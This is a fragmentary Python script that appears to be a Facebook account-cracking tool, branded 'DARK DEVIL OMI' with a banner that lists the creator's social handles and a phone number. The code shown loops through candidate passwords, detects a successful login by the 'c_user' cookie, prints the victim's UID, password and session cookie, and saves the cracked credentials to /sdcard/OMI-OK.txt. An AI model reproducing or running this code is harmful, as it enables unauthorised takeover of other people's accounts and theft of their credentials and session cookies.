...
ha = current.day
today = date.today()
#OMI2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mOMI')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-OMI/1.2.0 OPN-B'
...
def uaku():
    try:
        ...
        a=requests.get('https://www.facebook.com/kabsundisb?mibextid=ZbWKwL').text
        ff=open('show.txt','w')
...
\033[1;91m--------------------------------------------
\033[1;91m[✓] CREATOR   > DARK DEVIL OMI 
\033[1;91m[✓] FACEBOOK  > Omi Hasan 
\033[1;91m[✓] GITHUB    > OMIdark
\033[1;91m[✓] VERSION   > FREE
\033[1;91m[✓] WHATSAPP  > 01406115895
\033[1;91m--------------------------------------------{P}""")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio OMI_OK.mp3")
                print('\033[1;92m[OMI-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/OMI-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mOMI","\x1b[1;92mOMI","\x1b[1;93mOMI","\x1b[1;94mOMI","\x1b[1;95mOMI","\x1b[1;96mOMI","\x1b[1;97mOMI","\x1b[1;91mOMI","\x1b[1;92mOMI","\x1b[1;93mOMI","\x1b[1;94mOMI","\x1b[1;95mOMI","\x1b[1;96mOMI"])
